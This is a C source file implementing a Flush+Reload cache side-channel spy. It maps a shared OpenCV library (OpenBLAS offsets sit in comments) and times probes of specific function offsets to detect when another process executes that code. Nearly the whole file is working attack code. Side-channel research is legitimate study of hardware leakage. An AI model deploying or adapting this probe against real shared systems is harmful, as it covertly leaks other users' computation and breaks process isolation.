#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include "util.h"

#define SAMPLES 15000000
#define SLOT 2000
#define THRESHOLD 100
#define OFFSETNUM 3

void fr_probe(void **vlist, uint16_t *results){
    for(int i = 0; i<OFFSETNUM;i++){
        void *addr=vlist[i];
        int res = memaccesstime(addr);
        results[i] = res > UINT16_MAX ? UINT16_MAX : res;
        clflush(addr);
    }   
}

int is_active(uint16_t *results) {
  for (int i = 0; i < OFFSETNUM; i++)
    if (results[i] < THRESHOLD)
      return 1;
  return 0;
}

int fr_trace(void **ptrs,  uint16_t *results, int max_idle){

    uint64_t prev_time= rdtscp64();
    fr_probe(ptrs, results);
    do {
        do {
	        prev_time += SLOT;
        } while (slotwait(prev_time));
        fr_probe(ptrs, results);
    } while (!is_active(results));

    int count = 1;
    int idle_count = 0;
    int missed = 0;

    while (idle_count < max_idle && count < SAMPLES) {
    idle_count++;
    results += OFFSETNUM;
    count++;
    if (missed) {
      for (int i = 0; i < OFFSETNUM; i++)
	    results[i] = 0;
    } else {
      fr_probe(ptrs, results);
      if (is_active(results))
	    idle_count = 0;
    }
    prev_time += SLOT;
    missed = slotwait(prev_time);
    }

    return count;
}

int main(int argc, char** argv){

    //char *filename="/home/xiaoxuan/anaconda3/envs/wmob/lib/python3.8/site-packages/torch/lib/libopenblas.so.0";
    //char *filename="/usr/local/lib/libopenblas.so.0";
    char *filename="/usr/local/lib/libopencv_features2d.so.3.4.15";
    int fd=open(filename, O_RDONLY);
    if (fd < 0) {
		printf("cannot open features2d.so\n");
		exit(1);
	}
	struct stat st_buf;
	fstat(fd, &st_buf);
	int size = st_buf.st_size;

    char *map_addr=mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);

    //uint64_t offset[]={0x1938a2,0x19792e};      //{sgemm_incopy, sgemm_otcopy}
    //uint64_t offset[]={0x29c7b0,0x29d000};
    //uint64_t offset[]={0x41420,0x29c7b0,0x29d000,0x295a00};      //{cblas_dgemm, dgemm_incopy, dgemm_oncopy, dgemm_kernel}
    //uint64_t offset[]={0x190c88,0x1932af};   //{sgemm_itcopy,sgemm_oncopy}
    //uint64_t offset[]={0x05c725, 0x05c795, 0x05c837}; 
    //uint64_t offset[]={0x05adf3, 0x05aecd, 0x05af4e, 0x05b047}; 
    uint64_t offset[]={0x05aecd, 0x05af4e, 0x05b047}; 
    
    uint16_t *results = malloc(SAMPLES * OFFSETNUM * sizeof(uint16_t));   
    void **ptrs = malloc(sizeof(void *) * OFFSETNUM);
    char mark[]={'I','O','K','R'};

	for (int i = 0; i < OFFSETNUM; i++)
		ptrs[i] = map_addr + ((offset[i]) & ~0x3f);
    
    int l = fr_trace(ptrs, results, SAMPLES);

    for (int i = 0; i < l; i++) {
        int valid=0;
        for (int j = 0; j < OFFSETNUM; j++){
            //printf("%d ", results[i * OFFSETNUM + j]);
            int get_time=results[i * OFFSETNUM + j];
            if(get_time!=0 && get_time < THRESHOLD){
                printf("[%d]%c:t=%d ", i, mark[j],get_time);
                valid=1;
            }           
        }
        if(valid==1)
            putchar('\n');            
        //putchar('\n');
    }

    return 0;
}
